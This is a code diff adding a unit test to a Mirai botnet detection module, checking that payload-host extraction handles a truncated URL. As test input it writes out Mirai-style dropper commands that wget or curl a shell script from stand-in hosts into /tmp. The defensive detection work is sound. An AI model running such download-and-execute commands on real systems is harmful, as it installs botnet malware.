@@ -84,6 +84,13 @@ class MiraiTest(unittest.TestCase):
         self.assertNotEqual(rules.fingerprint(MIRAI), rules.fingerprint(other))
         self.assertEqual(rules.analyze(other)["markers"], ["ECCHI"])
 
+    def test_cut_off_url_is_not_a_host(self):
+        cmd = ("cd /tmp || cd /var; rm -f kla.sh; wget -O kla.sh http://203.0.113.66/bins/kla.sh 2>/dev/null || "
+               "curl -o kla.sh http://203.0.113.66/bins/kla.sh; " + "x" * 300)[:rules.INPUT_CAP - 14] + "http://203.0.1"
+        self.assertEqual(len(cmd), rules.INPUT_CAP)
+        self.assertEqual(rules.payload_hosts([cmd]), ["203.0.113.66"])
+        self.assertEqual(rules.payload_hosts(["wget http://198.51.100.7/x"]), ["198.51.100.7"])
+
     def test_lowercase_busybox_applets_are_not_markers(self):
         self.assertEqual(rules.analyze(["/bin/busybox wget http://198.51.100.7/x"])["markers"], [])
 
